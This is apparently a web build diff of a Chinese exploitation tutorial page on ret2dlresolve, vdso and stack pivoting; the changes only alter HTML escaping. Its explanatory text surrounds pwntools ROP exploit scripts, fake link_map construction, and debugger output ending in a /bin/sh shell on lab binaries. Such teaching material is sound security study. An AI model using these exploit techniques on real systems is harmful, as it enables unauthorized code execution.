             <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
-            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                 version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>我们发现，如果把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。 GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。</p>
@@ -3198,10 +3293,10 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 <li>最后执行利用脚本即可</li>
 </ul>
 <p>通过汇编代码，我们可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8</p>
-<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7fa4b09f7ea1 &lt;_dl_fixup+97&gt;     mov    rax, qword ptr [r10 + 0x1c8]
-   0x7fa4b09f7ea8 &lt;_dl_fixup+104&gt;    xor    r8d, r8d
-   0x7fa4b09f7eab &lt;_dl_fixup+107&gt;    test   rax, rax
-   0x7fa4b09f7eae &lt;_dl_fixup+110&gt;    je     _dl_fixup+156 &lt;_dl_fixup+156&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7fa4b09f7ea1 <_dl_fixup+97>     mov    rax, qword ptr [r10 + 0x1c8]
+   0x7fa4b09f7ea8 <_dl_fixup+104>    xor    r8d, r8d
+   0x7fa4b09f7eab <_dl_fixup+107>    test   rax, rax
+   0x7fa4b09f7eae <_dl_fixup+110>    je     _dl_fixup+156 <_dl_fixup+156><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>因此，我们可以简单修改下 exp。</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token comment" spellcheck="true"># context.log_level="debug"</span>
@@ -3311,7 +3406,7 @@ link_map_addr <span class="token operator">=</span> u64<span class="token punctu
 <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>link_map_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 
-<span class="token comment" spellcheck="true"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
+<span class="token comment" spellcheck="true"># set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
 rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
 rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
 rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>link_map_addr<span class="token operator">+</span><span class="token number">0x1c8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -3333,7 +3428,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7f7f3f74d3ec <do_system+1180>       call   execve <execve>
         path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* '/bin/sh' */
         argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* 'sh' */
-        envp: 0x7ffe636770a8 ◂— 0x10000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></execve></do_system+1180></code></pre>
+        envp: 0x7ffe636770a8 ◂— 0x10000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。</p>
 <p>首先，我们可以把读伪造的数据和 /bin/sh 部分的 rop 合并起来，以减少 ROP 的次数</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -3447,7 +3542,7 @@ link_map_addr <span class="token operator">=</span> u64<span class="token punctu
 <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>link_map_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 
-<span class="token comment" spellcheck="true"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
+<span class="token comment" spellcheck="true"># set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
 rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
 rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
 rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>link_map_addr<span class="token operator">+</span><span class="token number">0x1c8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -3469,7 +3564,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7f5a187703ec <do_system+1180>       call   execve <execve>
         path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* '/bin/sh' */
         argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* 'sh' */
-        envp: 0x7fff68270538 ◂— 0x6161616100000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></execve></do_system+1180></code></pre>
+        envp: 0x7fff68270538 ◂— 0x6161616100000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据 ‘a’。那就好办了，我们只需要把所有的 pad 都替换为 <code>\x00</code> 即可。</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token comment" spellcheck="true"># context.log_level="debug"</span>
@@ -3582,7 +3677,7 @@ link_map_addr <span class="token operator">=</span> u64<span class="token punctu
 <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>link_map_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 
-<span class="token comment" spellcheck="true"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
+<span class="token comment" spellcheck="true"># set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
 rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
 rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
 rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>link_map_addr<span class="token operator">+</span><span class="token number">0x1c8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -3620,16 +3715,16 @@ iromise<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <pre class="line-numbers language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/* Look up the target symbol.  If the normal lookup rules are not
       used don't look in the global scope.  */</span>
     <span class="token comment" spellcheck="true">// 判断符号的可见性</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span><span class="token punctuation">(</span>sym<span class="token operator">-&gt;</span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span><span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token comment" spellcheck="true">// 获取符号的版本信息</span>
         <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
             <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
-            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                 version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
         <span class="token comment" spellcheck="true">/* We need to keep the scope around so do some locking.  This is
@@ -3645,7 +3740,7 @@ iromise<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
         RTLD_ENABLE_FOREIGN_CALL<span class="token punctuation">;</span>
 <span class="token macro property">#<span class="token directive keyword">endif</span></span>
         <span class="token comment" spellcheck="true">// 查询待解析符号所在的目标文件的 link_map</span>
-        result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span><span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-&gt;</span>l_scope<span class="token punctuation">,</span>
+        result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span><span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-></span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-></span>l_scope<span class="token punctuation">,</span>
                                      version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token comment" spellcheck="true">/* We are done with the global scope.  */</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RTLD_SINGLE_THREAD_P<span class="token punctuation">)</span>
@@ -3656,7 +3751,7 @@ iromise<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
         <span class="token comment" spellcheck="true">/* Currently result contains the base load address (or link map)
          of the object that defines sym.  Now add in the symbol
          offset.  */</span>
-        <span class="token comment" spellcheck="true">// 基于查询到的 link_map 计算符号的绝对地址: result-&gt;l_addr + sym-&gt;st_value</span>
+        <span class="token comment" spellcheck="true">// 基于查询到的 link_map 计算符号的绝对地址: result->l_addr + sym->st_value</span>
         <span class="token comment" spellcheck="true">// l_addr 为待解析函数所在文件的基地址</span>
         value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>
                                     <span class="token function">SYMBOL_ADDRESS</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> sym<span class="token punctuation">,</span> false<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -3716,7 +3811,7 @@ iromise<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
        indexed by DT_VALTAGIDX(tagvalue) and
        [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
         DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
-       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span>
+       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h>.  */</span>
     <span class="token function">ElfW</span><span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span>l_info<span class="token punctuation">[</span>DT_NUM <span class="token operator">+</span> DT_THISPROCNUM <span class="token operator">+</span> DT_VERSIONTAGNUM
                       <span class="token operator">+</span> DT_EXTRANUM <span class="token operator">+</span> DT_VALNUM <span class="token operator">+</span> DT_ADDRNUM<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>一般而言，至少有 __libc_start_main 已经解析过了。本例中，显然不止这一个函数。</p>
@@ -3825,7 +3920,7 @@ vuln_addr <span class="token operator">=</span> <span class="token number">0x400
     linkmap <span class="token operator">=</span> p64<span class="token punctuation">(</span>offset_of_two_addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span>
     <span class="token comment" spellcheck="true"># here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset</span>
-    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr</span>
+    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">-</span> offset_of_two_addr<span class="token punctuation">)</span>
                    <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
@@ -4221,7 +4316,7 @@ libc <span class="token operator">=</span> ELF<span class="token punctuation">(<
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
     <span class="token comment" spellcheck="true"># here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset</span>
-    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr</span>
+    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x48</span> <span class="token operator">-</span> offset_of_two_addr<span class="token punctuation">)</span>
                    <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
@@ -4313,7 +4408,7 @@ libc <span class="token operator">=</span> ELF<span class="token punctuation">(<
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x88</span><span class="token punctuation">)</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
     <span class="token comment" spellcheck="true"># here we set p_r_offset = libc.sym["__free_hook"]-libc.sym["__libc_start_main"]</span>
-    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = __libc_start_main_addr</span>
+    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = __libc_start_main_addr</span>
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
 
     linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
@@ -4389,8 +4484,8 @@ uid=1000(iromise) gid=1000(iromise)...<span aria-hidden="true" class="line-numbe
 <p>当不同的处理器架构实现了不同的指令时，自然就会出现兼容性问题，所以linux实现了vsyscall接口，在底层会根据具体的结构来进行具体操作。而vsyscall就实现在vdso中。</p>
 <p>这里，我们顺便来看一下vdso，在Linux(kernel 2.6 or upper)中执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO。 例如:</p>
 <pre class="line-numbers language-shell"><code class="language-shell">➜  ~ ldd /bin/sh
-    linux-vdso.so.1 =&gt;  (0x00007ffd8ebf2000)
-    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f84ff2f9000)
+    linux-vdso.so.1 =>  (0x00007ffd8ebf2000)
+    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f84ff2f9000)
     /lib64/ld-linux-x86-64.so.2 (0x0000560cae6eb000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>除了快速系统调用，glibc也提供了VDSO的支持, open(), read(), write(), gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。 内核新特性在不影响glibc的情况下也可以更快的部署。</p>
 <p>这里我们以intel的处理器为例，进行简单说明。</p>
@@ -4641,19 +4736,19 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <pre class="line-numbers language-asm"><code class="language-asm">pop rsp/esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。</p>
 <pre class="line-numbers language-asm"><code class="language-asm">gef➤  x/7i 0x000000000040061a
-0x40061a &lt;__libc_csu_init+90&gt;:    pop    rbx
-0x40061b &lt;__libc_csu_init+91&gt;:    pop    rbp
-0x40061c &lt;__libc_csu_init+92&gt;:    pop    r12
-0x40061e &lt;__libc_csu_init+94&gt;:    pop    r13
-0x400620 &lt;__libc_csu_init+96&gt;:    pop    r14
-0x400622 &lt;__libc_csu_init+98&gt;:    pop    r15
-0x400624 &lt;__libc_csu_init+100&gt;:    ret    
+0x40061a <__libc_csu_init+90>:    pop    rbx
+0x40061b <__libc_csu_init+91>:    pop    rbp
+0x40061c <__libc_csu_init+92>:    pop    r12
+0x40061e <__libc_csu_init+94>:    pop    r13
+0x400620 <__libc_csu_init+96>:    pop    r14
+0x400622 <__libc_csu_init+98>:    pop    r15
+0x400624 <__libc_csu_init+100>:    ret    
 gef➤  x/7i 0x000000000040061d
-0x40061d &lt;__libc_csu_init+93&gt;:    pop    rsp
-0x40061e &lt;__libc_csu_init+94&gt;:    pop    r13
-0x400620 &lt;__libc_csu_init+96&gt;:    pop    r14
-0x400622 &lt;__libc_csu_init+98&gt;:    pop    r15
-0x400624 &lt;__libc_csu_init+100&gt;:    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+0x40061d <__libc_csu_init+93>:    pop    rsp
+0x40061e <__libc_csu_init+94>:    pop    r13
+0x400620 <__libc_csu_init+96>:    pop    r14
+0x400622 <__libc_csu_init+98>:    pop    r15
+0x400624 <__libc_csu_init+100>:    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>  此外，还有更加高级的 fake frame。</p>
 <ul>
 <li>存在可以控制内容的内存，一般有如下<ul>
@@ -4680,8 +4775,8 @@ gef➤  x/7i 0x000000000040061d
   puts("\n======================");
   puts("What's your name?");
   fflush(stdout);
-  fgets(&amp;s, 50, stdin);
-  printf("Hello %s.", &amp;s);
+  fgets(&s, 50, stdin);
+  printf("Hello %s.", &s);
   fflush(stdout);
   return 1;
 }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -4812,7 +4907,7 @@ int sub_400676()
   char buf[80]; // [rsp+0h] [rbp-50h]
 
   memset(buf, 0, sizeof(buf));
-  putchar('&gt;');
+  putchar('>');
   read(0, buf, 96uLL);
   return puts(buf);
 }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -4839,7 +4934,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
  RIP  0x4006b9 ◂— call   0x400530
 ─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
- ► 0x4006b9    call   puts@plt &lt;0x400530&gt;
+ ► 0x4006b9    call   puts@plt <0x400530>
         s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 
    0x4006be    leave
@@ -4850,7 +4945,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x4006c4    sub    rsp, 0x10
    0x4006c8    mov    dword ptr [rbp - 4], edi
    0x4006cb    mov    qword ptr [rbp - 0x10], rsi
-   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] &lt;0x601060&gt;
